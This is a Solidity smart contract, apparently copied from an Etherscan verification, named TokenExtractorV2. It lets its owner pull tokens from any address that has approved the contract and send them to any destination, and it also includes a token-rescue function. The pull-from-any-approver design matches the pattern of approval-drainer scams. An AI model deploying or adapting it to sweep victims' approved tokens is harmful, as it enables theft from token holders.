/**
 *Submitted for verification at Etherscan.io on 2025-09-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// 简化版 BEP20 接口（ERC20 兼容）
interface IBEP20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TokenExtractorV2 {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event TokenPulled(address indexed token, address indexed from, address indexed to, uint256 amount, address caller);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero newOwner");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    /// 手动从 from 拉取到 to（需要 from 先对本合约 approve）
    function withdrawTokenTo(
        address token,
        address from,
        address to,
        uint256 amount
    ) external onlyOwner {
        require(token != address(0), "Zero token");
        require(from != address(0), "Zero from");
        require(to != address(0), "Zero to");
        require(amount > 0, "Zero amount");

        uint256 allow = IBEP20(token).allowance(from, address(this));
        require(allow >= amount, "Insufficient allowance");

        _safeTransferFrom(token, from, to, amount);

        emit TokenPulled(token, from, to, amount, msg.sender);
    }

    function allowanceToThis(address token, address ownerAddr) external view returns (uint256) {
        return IBEP20(token).allowance(ownerAddr, address(this));
    }

    function balanceOf(address token, address account) external view returns (uint256) {
        return IBEP20(token).balanceOf(account);
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        // 0x23b872dd = transferFrom(address,address,uint256)
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transferFrom failed");
    }

    /// 取回误打到本合约地址的代币（仅 owner）
    function rescueToken(address token, uint256 amount, address to) external onlyOwner {
        require(token != address(0) && to != address(0), "Zero addr");
        // 0xa9059cbb = transfer(address,uint256)
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}